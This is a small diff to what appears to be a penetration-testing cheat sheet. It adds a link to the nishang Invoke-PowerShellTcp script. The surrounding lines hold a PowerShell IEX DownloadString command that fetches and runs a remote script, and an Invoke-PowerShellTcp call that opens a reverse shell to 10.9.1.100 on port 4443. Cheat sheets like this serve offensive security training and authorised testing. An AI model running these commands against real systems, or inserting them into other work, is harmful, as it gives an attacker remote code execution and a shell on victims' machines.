@@ -67,6 +67,7 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/power
 ```
 ```
 download Invoke-PowerShellTcp.ps1
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 Invoke-PowerShellTcp -Reverse -IPAddress 10.9.1.100 -Port 4443
 ```
 ### bind shell
